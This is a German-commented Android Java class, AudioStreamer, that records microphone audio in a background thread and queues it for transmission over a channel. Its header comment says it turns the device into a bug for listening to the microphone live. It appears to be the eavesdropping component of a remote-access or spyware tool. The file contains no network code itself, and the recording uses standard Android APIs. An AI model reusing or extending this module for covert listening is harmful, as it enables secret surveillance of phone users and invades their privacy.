package my.app.Library;

import java.util.concurrent.BlockingQueue;
import java.util.concurrent.LinkedBlockingQueue;

import android.content.Context;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.AudioRecord.OnRecordPositionUpdateListener;
import android.util.Log;

/**
 * Diese  Klasse implementiert den Audiostream. Hiermit wird es ermöglicht das Gerät in eine Wanze umzuwandeln
 * und die Aufnahmen des Mikrofons live mitzuhören.
 */
public class AudioStreamer {
	/**
	 * Die Klasse hat verschiedene Klassenvariablen
	 * String TAG  zur Identifizierung der Klasse
	 */
	public final String TAG = "AudioStreamer";
	/**
	 * boolean stop  Wird später zur Steuerung einer Schleife benötigt
	 */
	public boolean stop = false;
	/**
	 * BlokingQueue bbq  Um die von dem Mirofon augenommenen Daten zu speicher
	 */
	public BlockingQueue<byte[]> bbq = new LinkedBlockingQueue<byte[]>();
	/**
	 * frequency  Für die Frequenz mit der aufgenommen wird
	 */
	int frequency = 11025;
	/**
	 * channelConfiguration  Mono/Stereo-Autdio
	 */
	int channelConfiguration = AudioFormat.CHANNEL_CONFIGURATION_MONO;
	/**
	 *audioEncoding  16Bit Audio
	 */
	int audioEncoding = AudioFormat.ENCODING_PCM_16BIT;
	/**
	 * bufferSizeRecorder  Zum Festlegen der Buffergröße
	 */
	int bufferSizeRecorder;
	//int bufferSizePlayer;
	/**
	 * Verschiedene Buffer zum Zwischenspeichern
	 */
	byte[] buffer;
	byte[] buff; // pour le methode directe
	/**
	 * audioRecord Android Objekt zum Erhalten der Audiodaten
	 */
	AudioRecord audioRecord;
	//AudioTrack audioTrack;
	/**
	 * threcord  Ein neuer Thread zum Aufnehmen der Audiodaten
	 */
	Thread threcord;
	Context ctx;
	/**
	 * chan  Benötigt für die handelData Methode
	 */
	int chan ;

	/**
	 * Der Konstruktor der Klasse. Erstellt einen neuen audioRecord
	 * @param c Diese UpdateListener wird benachtrichtigt, sobald der Marker erreicht ist. Dies passiert jede Periode
	 * @param source Bestimmt welche Quelle zur Audioaufnahme benutzt werden soll
	 * @param chan Parameter für die handleData Methode
	 */
	public AudioStreamer(OnRecordPositionUpdateListener c, int source, int chan) {
		/**
		 * Die Klassenvariable wird mit dem übergebenen Parameter befüllt.
		 */
		this.chan = chan ;
		/**
		 * Diese Methode gibt die Minimalebuffergröße zurück, die benötigt wird um erfolgreich ein AudioRecordObject zu erstellen.
		 */
		bufferSizeRecorder = AudioRecord.getMinBufferSize(frequency, channelConfiguration, audioEncoding);
		/**
		 * Hier wird ein neuer AudioRecord erstellt unter Berücksichtigung der Übergebenden und definierten Parametern.
		 * Dieser wird dann in der KlassenVaribale audioRecord gespeichert.
		 */
		audioRecord = new AudioRecord(source, frequency, channelConfiguration, audioEncoding, bufferSizeRecorder);
		//audioRecord = new AudioRecord(MediaRecorder.AudioSource.MIC, frequency, channelConfiguration, audioEncoding, bufferSizeRecorder);
		/**
		 * Die Periode nachdem der PostionUpdateListener benachrichtigt wird.
		 */
		audioRecord.setPositionNotificationPeriod(512);
		audioRecord.setRecordPositionUpdateListener(c);
		
		//bufferSizePlayer = AudioTrack.getMinBufferSize(frequency, channelConfiguration, audioEncoding);
		//audioTrack = new AudioTrack(AudioManager.STREAM_MUSIC,frequency, channelConfiguration, audioEncoding, bufferSizePlayer,	AudioTrack.MODE_STREAM);
		/**
		 * Hier wird ein neuer Thread zur späteren Audioaufnahme kreiert und in der Klassenvaribalen threcord gespeichert.
		 */
		threcord = new Thread(
				new Runnable() {
					public void run() {
						record();
					}
				});


	}
	/**
	 * Startet den zuvorerstellten Thread und ruft die record-Methode auf. Zusätzlich wird hier die Variable stop auf false gesetzt.
	 * Dies ist nötig um die Schleife in der Methode record zu aktivieren.
	 */
	public void run() {
		Log.i(TAG, "Launch record thread");
		stop = false;
		threcord.start();
	}

	/**
	 * Die eigentliche Methode welche die Audioaufnahme durchführt.
	 */
	public void record() {
		/**
		 * Versuchen eine Audioaunahme zu starten
		 */
		try {
			/**
			 * Sollte der audioRecord nicht iniziallisiert sein so wird er gelöscht und ein Logeintrag ausgegeben.
			 * Danach wird die Methode mit dem return-Aufruf beendet.
			 */
			if (audioRecord.getState() == AudioRecord.STATE_UNINITIALIZED) {
				Log.e(TAG, "Initialisation failed !");
				audioRecord.release();
				audioRecord = null;
				return;
			}
			/**
			 * Initialisieren des Buffers
			 */
			buffer = new byte[bufferSizeRecorder];
			/**
			 * Der Aufruf dieser Methode startet die Aufnahme.
			 */
			audioRecord.startRecording();
			/**
			 * Solange stop == false wird diese Schleife laufen
			 */
			while (!stop) {
				/**
				 * Liest die Audiodaten des Recorders aus.
				 */
				int bufferReadResult = audioRecord.read(buffer, 0, bufferSizeRecorder);
				/**
				 * Neuer Byte-Buffer mit der Größe der gelesenen Daten.
				 */
				byte[] tmp = new byte[bufferReadResult];
				/**
				 * Übertragen der Daten in den Byte-Buffer
				 */
				System.arraycopy(buffer, 0, tmp, 0, bufferReadResult);
				/**
				 * Hinzufügen des Buffers zu der Queue
				 */
				bbq.add(tmp);
				// soit direct
				//buff = new byte[bufferReadResult];
				//System.arraycopy(buffer, 0, buff, 0, bufferReadResult);

			}
			/**
			 * Beenden der Audioaufnahme
			 */
			audioRecord.stop();

		} catch (Throwable t) {
			/**
			 * Logeintrag falls Audioaufnahme nicht gestartet werden konnte
			 */
			Log.e("AudioRecord", "Recording Failed");
		}
		
	}

	/**
	 * Methode die die Daten die in der Queue gespeichert sind zurückliefert
	 * @return  Die Queue,falls Daten in ihr gespeicher sind ansonsten null
	 */
	public byte[] getData() {
		//return buff;
		//ou 
		try {
			/**
			 * Wenn bbq nicht leer ist, wird die Methode take aufgerufen, die den Head der Queue zurückliefert,
			 * jedoch wartet falls das Element noch nicht Verfügbar ist.
			 */
			if(!bbq.isEmpty()) {
				return bbq.take();
			}
		} catch (InterruptedException e) {
		}
		/**
		 * Sonst gibt sie null zurück
		 */
		return null;
	}

	/**
	 * Setzt die stop-Varibale auf true und beendet somit die while-Schleife der Methode-record
	 */
	public void stop() {
		stop = true;
	}

	/**
	 * Gibt die Variable chan zurück.
	 * @return Der Channel für die Datenübertragung.
	 */
	public int getChannel() {
		return chan;
	}
}
